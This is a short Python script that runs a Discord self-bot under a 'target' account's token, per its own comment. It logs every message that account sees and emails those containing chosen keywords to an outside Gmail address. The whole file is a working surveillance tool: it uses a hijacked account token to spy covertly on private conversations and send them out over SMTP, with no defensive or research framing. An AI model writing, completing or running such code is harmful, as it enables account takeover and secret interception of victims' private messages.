import discord
import smtplib, ssl
from discord.ext import commands
import asyncio
token = "token" #insert target token
prefix = ""
client = discord.Client()
message = discord.Message 
bot = commands.Bot(command_prefix=prefix, self_bot=True)
@bot.event
async def on_message(message):
    print("on:" + " " + message.guild.name + " " + " in ch:" + " " +  message.channel.name + " " + "from:" + " " + message.author.name + ":" + " " + message.content)
    list = ['i love you', 'if a message contains one of these a email with the content will be sent']
    for x in list:
        if str(x) in message.content:
            port = 587
            smtp_server = "smtp.gmail.com"
            sender_email = "from@gmail.com"
            receiver_email = "to@gmail.com"
            password = "frompassword"
            messaggio = "on:" + " " + message.guild.name + " " + " in ch:" + " " +  message.channel.name + " " + "from:" + " " + message.author.name + ":" + " " + message.content
            context = ssl.create_default_context()
            with smtplib.SMTP(smtp_server, port) as server:
                server.ehlo()
                server.starttls(context=context)
                server.ehlo()  
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, messaggio)
asyncio.set_event_loop(asyncio.new_event_loop())
loop = asyncio.new_event_loop()
bot.run(token, bot=False)
